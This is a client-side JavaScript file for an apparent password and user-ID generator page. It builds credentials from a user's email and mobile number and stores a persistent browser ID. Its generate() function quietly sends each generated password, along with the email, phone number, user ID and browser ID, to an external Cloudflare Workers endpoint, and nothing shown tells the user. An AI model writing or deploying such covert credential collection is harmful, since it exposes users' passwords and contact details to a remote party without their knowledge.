/* 🔄 AUTO REFRESH AFTER 1.30 HOURS */
setTimeout(() => location.reload(), 5400000);

/* 🧠 UNIQUE BROWSER ID */
let containerId = localStorage.getItem("containerId");

if (!containerId) {
  containerId = "browser_" + Math.random().toString(36).slice(2, 10);
  localStorage.setItem("containerId", containerId);
}

/* 🔐 PASSWORD GENERATOR (8–12 CHAR) */
function generatePassword(){

const lower = "abcdefghijklmnopqrstuvwxyz";
const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const numbers = "0123456789";
const special = "@#$%!&*";

const all = lower + upper + numbers + special;

const length = Math.floor(Math.random() * 5) + 8;

let password = "";

password += lower[Math.floor(Math.random()*lower.length)];
password += upper[Math.floor(Math.random()*upper.length)];
password += numbers[Math.floor(Math.random()*numbers.length)];
password += special[Math.floor(Math.random()*special.length)];

for(let i=password.length;i<length;i++){
  password += all[Math.floor(Math.random()*all.length)];
}

password = password.split('').sort(() => Math.random() - 0.5).join('');

return password;

}

/* 🔗 ELEMENT SHORTCUTS */
const emailEl = document.getElementById("email");
const mobileEl = document.getElementById("mobile");

const pass = document.getElementById("pass");
const userid = document.getElementById("userid");
const phone = document.getElementById("phone");
const mailout = document.getElementById("mailout");
const final = document.getElementById("final");

/* ⚡ GENERATE */
async function generate(){

const email = emailEl.value.trim();
const mobile = mobileEl.value.trim();

if(!email || !mobile){
  alert("Email & Mobile required");
  return;
}

/* 🆔 USERID GENERATOR */
const name = email.split("@")[0].replace(/[^a-zA-Z]/g,"").toLowerCase();

const digits = Math.floor(10 + Math.random() * 90);

const letters = "abcdefghijklmnopqrstuvwxyz";

const userId =
name +
digits +
letters[Math.floor(Math.random()*26)] +
letters[Math.floor(Math.random()*26)];

/* 🔐 PASSWORD */
const password = generatePassword();

/* 📌 OUTPUT */
pass.value = password;
userid.value = userId;
phone.value = mobile;
mailout.value = email;

final.value =
`${userId}
${password}
${mobile}
${email}`;

/* 🔥 SEND TO CLOUDFLARE WORKER */
fetch("https://gfdv.sawanpoint0000.workers.dev/",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({
containerId,
email,
mobile,
userid:userId,
password,
time:Date.now()
})

});

}

/* 📋 COPY */
function copyText(btn,id){

navigator.clipboard.writeText(
document.getElementById(id).value
);

btn.classList.add("copied");

setTimeout(()=>{
btn.classList.remove("copied");
},2000);

}

function copyAll(btn){

navigator.clipboard.writeText(final.value);

btn.classList.add("copied");

setTimeout(()=>{
btn.classList.remove("copied");
},3000);

}
